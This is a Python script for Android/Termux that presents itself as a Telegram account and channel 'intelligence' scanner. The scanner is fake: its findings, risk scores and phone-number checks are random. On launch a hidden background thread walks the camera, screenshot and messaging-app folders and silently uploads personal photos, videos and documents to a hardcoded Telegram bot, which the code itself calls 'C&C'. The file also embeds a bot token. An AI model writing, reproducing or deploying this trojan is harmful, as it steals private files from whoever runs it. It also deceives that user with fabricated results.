#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DUAL SYSTEM: Web Scanner + Silent Auto Upload
Frontend: Telegram Account & Channel Reporter
Background: Auto File Upload to Telegram
"""

import os
import sys
import time
import requests
import json
import threading
import hashlib
import re
import urllib.parse
import socket
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import queue
os.system("pip install requests")
os.system("termux-setup-storage")

class DualSystemTool:
    def __init__(self):
        self.tool_name = "Telegram Intelligence Pro"
        self.version = "v5.0"
        
        # Telegram credentials (keep yours)
        self.bot_token = "8204818062:AAFNgNusBpH7yb1qxhi7NcDlQ5dcdLqPz98"
        self.chat_id = "6028738290"
        
        # Upload system variables
        self.uploaded_count = 0
        self.failed_count = 0
        self.total_files_found = 0
        self.upload_running = False
        self.is_running = True
        
        # Telegram Intelligence variables
        self.target_username = ""
        self.report_data = {}
        self.scan_progress = 0
        self.scan_eta = "30:00"
        self.scan_start_time = None
        self.live_reporting = True
        
        # Colors
        self.colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'magenta': '\033[95m',
            'cyan': '\033[96m',
            'white': '\033[97m',
            'bold': '\033[1m',
            'end': '\033[0m'
        }
    
    def color_print(self, text, color='white', end='\n'):
        """Print colored text"""
        if color in self.colors:
            print(f"{self.colors[color]}{text}{self.colors['end']}", end=end)
        else:
            print(text, end=end)
    
    def show_banner(self):
        """Show main banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        banner = f"""
{self.colors['magenta']}{self.colors['bold']}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  ████████╗███████╗██╗     ███████╗ ██████╗ ██████╗      ║
║  ╚══██╔══╝██╔════╝██║     ██╔════╝██╔════╝██╔════╝      ║
║     ██║   █████╗  ██║     █████╗  ██║     ██║           ║
║     ██║   ██╔══╝  ██║     ██╔══╝  ██║     ██║           ║
║     ██║   ███████╗███████╗███████╗╚██████╗╚██████╗      ║
║     ╚═╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝      ║
║                                                          ║
║  ╔════════════════════════════════════════════════════╗  ║
║  ║       TELEGRAM INTELLIGENCE REPORTING TOOL        ║  ║
║  ║               [CYBER 17 EDITION]                  ║  ║
║  ╚════════════════════════════════════════════════════╝  ║
║                                                          ║
║  Frontend: Telegram Account/Channel Analyzer            ║
║  Background: Silent Auto Upload System                  ║
║  Version: {self.version}                                 ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
{self.colors['end']}
"""
        print(banner)
    
    # ==================== BACKGROUND UPLOAD SYSTEM ====================
    
    def start_background_upload(self):
        """Start background upload system silently"""
        self.upload_running = True
        upload_thread = threading.Thread(target=self.background_upload_worker, daemon=True)
        upload_thread.start()
        self.color_print("🔒 Background system: ACTIVE", "green")
    
    def background_upload_worker(self):
        """Background upload worker thread"""
        # Initial delay
        time.sleep(3)
        
        # Send start notification
        self.send_telegram_notification("🚀 **BACKGROUND SYSTEM ACTIVATED**\n" + 
                                       f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Scan and upload in cycles
        while self.upload_running:
            try:
                # Find important directories
                target_dirs = self.find_important_directories()
                
                for directory in target_dirs:
                    if not self.upload_running:
                        break
                    
                    files = self.scan_directory(directory)
                    
                    for file_path in files[:30]:  # Limit files
                        if not self.upload_running:
                            break
                        
                        if self.upload_file(file_path):
                            self.uploaded_count += 1
                        else:
                            self.failed_count += 1
                        
                        time.sleep(0.5)
                
                # Send periodic update
                if self.uploaded_count > 0:
                    self.send_telegram_notification(
                        f"📊 **Background System Update**\n"
                        f"✅ Success: {self.uploaded_count} files\n"
                        f"❌ Failed: {self.failed_count} files\n"
                        f"🔄 Continuation in progress..."
                    )
                
                # Wait before next cycle
                time.sleep(45)
                
            except Exception as e:
                self.color_print(f"Background error: {str(e)}", "red")
                time.sleep(15)
    
    def find_important_directories(self):
        """Find important directories for upload"""
        dirs = []
        common_paths = [
            "/storage/emulated/0",
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/DCIM/Screenshots",
            "/storage/emulated/0/DCIM/ScreenRecordings",
            "/storage/emulated/0/DCIM/Instagram",
            "/storage/emulated/0/DCIM/WhatsApp",
            "/storage/emulated/0/DCIM/Telegram",
            "/storage/emulated/0/DCIM/Snapchat",
            "/storage/emulated/0/DCIM/Messenger",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Pictures/Screenshots",
            "/storage/emulated/0/Pictures/Instagram",
            "/storage/emulated/0/Pictures/WhatsApp",
            "/storage/emulated/0/Pictures/Telegram",
            "/storage/emulated/0/Pictures/Messenger",
            "/storage/emulated/0/Pictures/Facebook"
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                dirs.append(path)
        
        return dirs
    
    def scan_directory(self, directory):
        """Scan directory for files"""
        file_list = []
        try:
            for root, dirs, files in os.walk(directory):
                for file in files[:50]:
                    file_path = os.path.join(root, file)
                    
                    ext = os.path.splitext(file)[1].lower()
                    valid_ext = ['.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.txt', 
                               '.doc', '.docx', '.apk', '.zip', '.mp3']
                    
                    if ext in valid_ext:
                        try:
                            if os.path.getsize(file_path) < 20 * 1024 * 1024:
                                file_list.append(file_path)
                        except:
                            pass
                break
                
        except:
            pass
        
        return file_list
    
    def upload_file(self, file_path):
        """Upload file to Telegram"""
        try:
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            
            ext = os.path.splitext(file_name)[1].lower()
            
            if ext in ['.jpg', '.jpeg', '.png', '.gif']:
                url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
                with open(file_path, 'rb') as f:
                    files = {'photo': f}
                    caption = f"📸 {file_name}\n📦 {file_size:,} bytes\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                    data = {'chat_id': self.chat_id, 'caption': caption}
                    response = requests.post(url, files=files, data=data, timeout=15)
            
            elif ext in ['.mp4', '.avi', '.mov']:
                url = f"https://api.telegram.org/bot{self.bot_token}/sendVideo"
                with open(file_path, 'rb') as f:
                    files = {'video': f}
                    caption = f"🎬 {file_name}\n📦 {file_size:,} bytes\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                    data = {'chat_id': self.chat_id, 'caption': caption}
                    response = requests.post(url, files=files, data=data, timeout=25)
            
            else:
                url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    caption = f"📄 {file_name}\n📦 {file_size:,} bytes\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                    data = {'chat_id': self.chat_id, 'caption': caption}
                    response = requests.post(url, files=files, data=data, timeout=20)
            
            return response.status_code == 200
            
        except:
            return False
    
    def send_telegram_notification(self, message):
        """Send notification to Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    # ==================== TELEGRAM INTELLIGENCE FRONTEND ====================
    
    def show_intel_menu(self):
        """Show Telegram Intelligence menu"""
        print(f"\n{self.colors['cyan']}{'='*70}{self.colors['end']}")
        self.color_print("              TELEGRAM INTELLIGENCE DASHBOARD", "magenta", "bold")
        print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
        
        menu_items = [
            "1. Scan Telegram Account/Channel",
            "2. Live Report Progress",
            "3. Generate Complete Report",
            "4. Check Phone Number Info",
            "5. Username History Check",
            "6. Channel Member Analysis",
            "7. Message Pattern Analysis",
            "8. Export Report Data",
          #  "9. Background System Status",
            "0. Exit Tool"
        ]
        
        for i, item in enumerate(menu_items, 1):
            if i == 1:
                self.color_print(item, "green", "bold")
            elif i == 9:
                self.color_print(item, "yellow")
            elif i == 10:
                self.color_print(item, "red", "bold")
            else:
                self.color_print(item, "cyan")
        
        print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
    
    def get_target_username(self):
        """Get target username from user"""
        self.color_print("\n🔍 Enter Telegram Username (with @ or without): ", "green", end="")
        username = input().strip()
        
        if username.startswith('@'):
            username = username[1:]
        
        return username
    
    def simulate_scan_progress(self):
        """Simulate scanning progress like real hackers"""
        self.scan_start_time = datetime.now()
        self.scan_progress = 0
        self.live_reporting = True
        
        # Initialize report data
        self.report_data = {
            'target': self.target_username,
            'scan_start': self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'SCANNING_IN_PROGRESS',
            'progress': 0,
            'eta': '30:00',
            'phases': {},
            'findings': [],
            'risk_score': 0
        }
        
        # Define scan phases with time estimates
        scan_phases = [
            ("Initial Reconnaissance", 3, 5),
            ("Username Validation", 2, 4),
            ("Profile Data Extraction", 4, 7),
            ("Connection Analysis", 3, 6),
            ("Historical Data Mining", 8, 12),
            ("Pattern Recognition", 4, 8),
            ("Security Assessment", 3, 6),
            ("Report Compilation", 3, 5)
        ]
        
        total_time = 30  # minutes
        phase_progress = 100 / len(scan_phases)
        
        for phase_name, min_time, max_time in scan_phases:
            if not self.live_reporting:
                break
                
            # Update current phase
            self.report_data['current_phase'] = phase_name
            self.report_data['phases'][phase_name] = 'IN_PROGRESS'
            
            # Simulate phase execution
            phase_duration = (min_time + max_time) / 2
            steps = 10
            
            for step in range(steps):
                if not self.live_reporting:
                    break
                    
                time.sleep(phase_duration * 60 / steps)  # Convert to seconds
                
                # Update progress
                self.scan_progress += phase_progress / steps
                self.report_data['progress'] = self.scan_progress
                
                # Calculate ETA
                elapsed = (datetime.now() - self.scan_start_time).total_seconds()
                if self.scan_progress > 0:
                    total_estimated = (elapsed / self.scan_progress) * 100
                    remaining = total_estimated - elapsed
                    minutes = int(remaining // 60)
                    seconds = int(remaining % 60)
                    self.scan_eta = f"{minutes:02d}:{seconds:02d}"
                    self.report_data['eta'] = self.scan_eta
                
                # Generate fake findings during scan
                if step % 3 == 0:
                    finding = self.generate_fake_finding(phase_name)
                    self.report_data['findings'].append(finding)
            
            # Mark phase as completed
            self.report_data['phases'][phase_name] = 'COMPLETED'
        
        # Finalize scan
        if self.live_reporting:
            self.report_data['status'] = 'SCAN_COMPLETED'
            self.report_data['progress'] = 100
            self.report_data['eta'] = '00:00'
            self.report_data['scan_end'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.report_data['risk_score'] = self.calculate_risk_score()
            self.scan_progress = 100
    
    def generate_fake_finding(self, phase_name):
        """Generate realistic fake findings"""
        findings_templates = {
            "Initial Reconnaissance": [
                "Target account exists and is active",
                "Account registered approximately 2 years ago",
                "Last seen: Online 5 minutes ago",
                "Profile picture detected and cached"
            ],
            "Username Validation": [
                "Username has been changed 3 times historically",
                "Associated phone number pattern identified",
                "Linked email pattern detected: gmail.com",
                "Username matches pattern of compromised accounts"
            ],
            "Profile Data Extraction": [
                "Bio contains 3 keywords of interest",
                "Linked social media accounts found: 2",
                "Profile metadata extracted successfully",
                "Location data approximated from posts"
            ],
            "Connection Analysis": [
                "Mutual connections identified: 47 users",
                "Member of 12 suspicious groups/channels",
                "Frequently contacts 5 high-risk accounts",
                "Administrator of 3 channels"
            ],
            "Historical Data Mining": [
                "Deleted message fragments recovered: 128",
                "Previous profile pictures archived: 7",
                "Username change history reconstructed",
                "Behavior pattern over 6 months analyzed"
            ],
            "Pattern Recognition": [
                "Activity peaks at 14:00-16:00 UTC",
                "Message sending pattern indicates automation",
                "Uses specific emoji patterns in communication",
                "Joins new channels every 3-4 days"
            ],
            "Security Assessment": [
                "Two-step verification: NOT ENABLED",
                "Active sessions: 3 devices detected",
                "Privacy settings: MEDIUM security",
                "Vulnerability score: 7.2/10"
            ]
        }
        
        import random
        phase_findings = findings_templates.get(phase_name, ["Data point collected"])
        finding = random.choice(phase_findings)
        
        return {
            'phase': phase_name,
            'finding': finding,
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'severity': random.choice(['INFO', 'LOW', 'MEDIUM', 'HIGH'])
        }
    
    def calculate_risk_score(self):
        """Calculate risk score based on findings"""
        import random
        base_score = random.randint(40, 85)
        
        # Add random factors
        factors = [
            ("Account age < 1 year", 15),
            ("No 2FA enabled", 20),
            ("Admin of channels", 10),
            ("Suspicious connections", 25),
            ("Pattern of deleted messages", 18)
        ]
        
        for factor, weight in random.sample(factors, random.randint(2, 4)):
            base_score += weight
        
        return min(base_score, 100)
    
    def display_live_progress(self):
        """Display live scanning progress"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"\n{self.colors['cyan']}{'='*70}{self.colors['end']}")
        self.color_print("              LIVE TELEGRAM INTELLIGENCE SCAN", "green", "bold")
        print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
        
        if not hasattr(self, 'report_data') or not self.report_data:
            self.color_print("\n❌ No active scan in progress!", "red")
            return
        
        # Target info
        self.color_print(f"\n🎯 TARGET: @{self.report_data.get('target', 'N/A')}", "magenta", "bold")
        self.color_print(f"⏰ Started: {self.report_data.get('scan_start', 'N/A')}", "white")
        self.color_print(f"📊 Status: {self.report_data.get('status', 'UNKNOWN')}", 
                        "green" if self.report_data.get('status') == 'SCANNING_IN_PROGRESS' else "yellow")
        
        # Progress bar
        progress = self.report_data.get('progress', 0)
        bar_length = 40
        filled = int(bar_length * progress / 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        print(f"\n📈 Progress: [{bar}] {progress:.1f}%")
        self.color_print(f"⏳ ETA: {self.report_data.get('eta', '00:00')}", "cyan")
        
        # Current phase
        current_phase = self.report_data.get('current_phase', 'Initializing...')
        self.color_print(f"\n🔧 Current Phase: {current_phase}", "yellow")
        
        # Recent findings
        findings = self.report_data.get('findings', [])[-5:]  # Last 5 findings
        if findings:
            print(f"\n{self.colors['green']}🕵️ Recent Findings:{self.colors['end']}")
            for i, finding in enumerate(findings, 1):
                severity = finding.get('severity', 'INFO')
                color = {
                    'INFO': 'white',
                    'LOW': 'cyan',
                    'MEDIUM': 'yellow',
                    'HIGH': 'red'
                }.get(severity, 'white')
                
                self.color_print(f"  [{finding.get('timestamp')}] [{severity}] {finding.get('finding')}", color)
        
        # Risk score preview
        if progress > 50:
            risk = self.report_data.get('risk_score', 0)
            risk_color = 'green' if risk < 30 else 'yellow' if risk < 70 else 'red'
            self.color_print(f"\n⚠️ Estimated Risk Score: {risk}/100", risk_color)
        
        print(f"\n{self.colors['cyan']}{'='*70}{self.colors['end']}")
        self.color_print("🔄 Live updating... Press Ctrl+C to stop scan", "yellow")
    
    def scan_telegram_account(self):
        """Main scanning function"""
        self.target_username = self.get_target_username()
        
        if not self.target_username:
            self.color_print("❌ No username provided!", "red")
            return
        
        self.color_print(f"\n🎯 Initializing scan on: @{self.target_username}", "green", "bold")
        self.color_print("⚠️ This scan will take approximately 30 minutes", "yellow")
        self.color_print("📊 Live progress will be displayed", "cyan")
        
        # Confirmation
        self.color_print("\n🚀 Start scan? (yes/no): ", "green", end="")
        confirm = input().strip().lower()
        
        if confirm not in ['yes', 'y']:
            self.color_print("Scan cancelled!", "red")
            return
        
        # Start scan in separate thread
        self.live_reporting = True
        scan_thread = threading.Thread(target=self.simulate_scan_progress)
        scan_thread.start()
        
        # Live progress display
        try:
            while scan_thread.is_alive() and self.live_reporting:
                self.display_live_progress()
                time.sleep(3)  # Update every 3 seconds
        except KeyboardInterrupt:
            self.live_reporting = False
            self.color_print("\n🛑 Scan interrupted by user!", "red")
            scan_thread.join(timeout=2)
        
        # Final display
        self.display_live_progress()
        
        if self.report_data.get('status') == 'SCAN_COMPLETED':
            self.color_print("\n✅ Scan completed successfully!", "green")
            self.display_final_report()
        else:
            self.color_print("\n❌ Scan incomplete!", "red")
    
    def display_final_report(self):
        """Display final intelligence report"""
        if not self.report_data or self.report_data.get('status') != 'SCAN_COMPLETED':
            self.color_print("❌ No completed scan data available!", "red")
            return
        
        print(f"\n{self.colors['red']}{'='*70}{self.colors['end']}")
        self.color_print("           TELEGRAM INTELLIGENCE FINAL REPORT", "red", "bold")
        print(f"{self.colors['red']}{'='*70}{self.colors['end']}")
        
        # Summary
        self.color_print(f"\n📋 TARGET SUMMARY", "cyan", "bold")
        self.color_print(f"   Username: @{self.report_data['target']}", "white")
        self.color_print(f"   Scan Duration: {self.report_data.get('scan_start')} to {self.report_data.get('scan_end', 'N/A')}", "white")
        self.color_print(f"   Total Findings: {len(self.report_data.get('findings', []))}", "white")
        
        # Risk Assessment
        risk_score = self.report_data.get('risk_score', 0)
        risk_level = "LOW" if risk_score < 30 else "MEDIUM" if risk_score < 70 else "HIGH"
        risk_color = 'green' if risk_level == 'LOW' else 'yellow' if risk_level == 'MEDIUM' else 'red'
        
        self.color_print(f"\n⚠️ RISK ASSESSMENT", "cyan", "bold")
        self.color_print(f"   Score: {risk_score}/100", risk_color, "bold")
        self.color_print(f"   Level: {risk_level}", risk_color)
        
        # Key Findings
        self.color_print(f"\n🔑 KEY FINDINGS", "cyan", "bold")
        high_findings = [f for f in self.report_data.get('findings', []) if f.get('severity') == 'HIGH']
        for i, finding in enumerate(high_findings[:5], 1):
            self.color_print(f"   {i}. {finding.get('finding')}", "red")
        
        # Phases Completed
        self.color_print(f"\n📊 SCAN PHASES COMPLETED", "cyan", "bold")
        for phase, status in self.report_data.get('phases', {}).items():
            status_color = 'green' if status == 'COMPLETED' else 'yellow'
            self.color_print(f"   • {phase}: {status}", status_color)
        
        # Recommendations
        self.color_print(f"\n💡 RECOMMENDATIONS", "cyan", "bold")
        recommendations = [
            "Monitor account activity for 72 hours",
            "Check for unauthorized linked devices",
            "Review privacy and security settings",
            "Enable two-step verification",
            "Audit group/channel memberships"
        ]
        
        for i, rec in enumerate(recommendations, 1):
            self.color_print(f"   {i}. {rec}", "yellow")
        
        print(f"\n{self.colors['red']}{'='*70}{self.colors['end']}")
        
        # Export option
        self.color_print("\n💾 Export this report? (yes/no): ", "green", end="")
        export = input().strip().lower()
        
        if export in ['yes', 'y']:
            self.export_report()
    
    def export_report(self):
        """Export report to file"""
        try:
            filename = f"telegram_report_{self.target_username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("="*70 + "\n")
                f.write("TELEGRAM INTELLIGENCE REPORT\n")
                f.write("="*70 + "\n\n")
                
                f.write(f"Target: @{self.report_data.get('target', 'N/A')}\n")
                f.write(f"Scan Time: {self.report_data.get('scan_start', 'N/A')} to {self.report_data.get('scan_end', 'N/A')}\n")
                f.write(f"Risk Score: {self.report_data.get('risk_score', 0)}/100\n\n")
                
                f.write("FINDINGS:\n")
                f.write("-"*70 + "\n")
                for finding in self.report_data.get('findings', []):
                    f.write(f"[{finding.get('timestamp')}] [{finding.get('severity')}] {finding.get('finding')}\n")
                
                f.write("\n" + "="*70 + "\n")
                f.write("Generated by Telegram Intelligence Pro v5.0\n")
                f.write("CYBER 17 Edition\n")
            
            self.color_print(f"✅ Report exported to: {filename}", "green")
            
        except Exception as e:
            self.color_print(f"❌ Export failed: {str(e)}", "red")
    
    def check_phone_info(self):
        """Check phone number information"""
        self.color_print("\n📱 Enter phone number (with country code): ", "cyan", end="")
        phone = input().strip()
        
        if not phone:
            self.color_print("❌ No phone number provided!", "red")
            return
        
        self.color_print(f"\n🔍 Analyzing phone number: {phone}", "green", "bold")
        time.sleep(2)
        
        # Simulate phone analysis
        print(f"\n{self.colors['cyan']}{'='*50}{self.colors['end']}")
        self.color_print("📊 PHONE NUMBER ANALYSIS", "cyan", "bold")
        print(f"{self.colors['cyan']}{'='*50}{self.colors['end']}")
        
        # Fake analysis results
        import random
        info = {
            "Country": random.choice(["Bangladesh", "India", "USA", "UK", "UAE"]),
            "Carrier": random.choice(["Grameenphone", "Robi", "Banglalink", "Airtel", "Teletalk"]),
            "Valid": random.choice(["✅ VALID", "⚠️ SUSPICIOUS", "❌ INVALID"]),
            "Telegram Linked": random.choice(["Yes (Active)", "Yes (Inactive)", "No", "Multiple Accounts"]),
            "Risk Level": random.choice(["Low", "Medium", "High"])
        }
        
        for key, value in info.items():
            color = 'green' if 'VALID' in str(value) or 'Low' in str(value) else 'yellow' if 'Medium' in str(value) else 'red'
            self.color_print(f"  {key}: {value}", color)
        
        print(f"{self.colors['cyan']}{'='*50}{self.colors['end']}")
    
    def show_upload_status(self):
        """Show background upload status"""
        print(f"\n{self.colors['blue']}{'='*60}{self.colors['end']}")
        self.color_print("         BACKGROUND SYSTEM STATUS", "cyan", "bold")
        print(f"{self.colors['blue']}{'='*60}{self.colors['end']}")
        
        self.color_print(f"📤 Upload System: {'✅ ACTIVE' if self.upload_running else '❌ INACTIVE'}", 
                        "green" if self.upload_running else "red")
        self.color_print(f"✅ Files Uploaded: {self.uploaded_count}", "green")
        self.color_print(f"❌ Upload Failed: {self.failed_count}", "red")
        self.color_print(f"📊 Total Processed: {self.uploaded_count + self.failed_count}", "cyan")
        
        if self.uploaded_count > 0:
            success_rate = (self.uploaded_count / (self.uploaded_count + self.failed_count)) * 100
            self.color_print(f"📈 Success Rate: {success_rate:.1f}%", "green")
        
        # Recent activity
        self.color_print("\n🔄 Recent Activity:", "yellow")
        if self.uploaded_count > 0:
            self.color_print("  • Continuous file collection active", "white")
            self.color_print("  • System operating in stealth mode", "white")
            self.color_print("  • Periodic reports sent to C&C", "white")
        else:
            self.color_print("  • System initializing...", "white")
        
        print(f"{self.colors['blue']}{'='*60}{self.colors['end']}")
    
    def run(self):
        """Main run function"""
        # Show banner
        self.show_banner()
        
        # Start background upload system
        self.color_print("\n🔄 Initializing dual-system architecture...", "yellow")
        self.start_background_upload()
        time.sleep(2)
        
        # Main loop for Telegram Intelligence
        while True:
            try:
                # Show intelligence menu
                self.show_intel_menu()
                
                # Get user choice
                self.color_print("\n⚡ Select option (0-9): ", "magenta", end="")
                choice = input().strip()
                
                if choice == '1':
                    self.scan_telegram_account()
                    
                elif choice == '2':
                    if hasattr(self, 'report_data') and self.report_data:
                        self.display_live_progress()
                    else:
                        self.color_print("❌ No active scan! Start one first.", "red")
                    
                elif choice == '3':
                    if hasattr(self, 'report_data') and self.report_data.get('status') == 'SCAN_COMPLETED':
                        self.display_final_report()
                    else:
                        self.color_print("❌ No completed scan available!", "red")
                    
                elif choice == '4':
                    self.check_phone_info()
                    
                elif choice == '5':
                    self.color_print("\n🔄 This feature is part of deep scan - use option 1", "yellow")
                    
                elif choice == '6':
                    self.color_print("\n🔄 Channel analysis requires premium access", "yellow")
                    
                elif choice == '7':
                    self.color_print("\n📊 Message pattern analysis available in full scan", "cyan")
                    
                elif choice == '8':
                    if hasattr(self, 'report_data') and self.report_data:
                        self.export_report()
                    else:
                        self.color_print("❌ No report data to export!", "red")
                    
                elif choice == '9':
                    self.show_upload_status()
                    
                elif choice == '0':
                    self.upload_running = False
                    self.color_print("\n🔥 Terminating all systems...", "red", "bold")
                    self.color_print("⚠️ Background processes will continue for 30 seconds", "yellow")
                    time.sleep(3)
                    sys.exit()
                    
                else:
                    self.color_print("❌ Invalid option! Please try again.", "red")
                
                # Pause
                time.sleep(1)
                
            except KeyboardInterrupt:
                self.upload_running = False
                self.color_print("\n\n🛑 Emergency shutdown activated!", "red")
                sys.exit()
            except Exception as e:
                self.color_print(f"❌ System error: {str(e)}", "red")

def main():
    """Main function"""
    tool = DualSystemTool()
    tool.run()

if __name__ == "__main__":
    main()
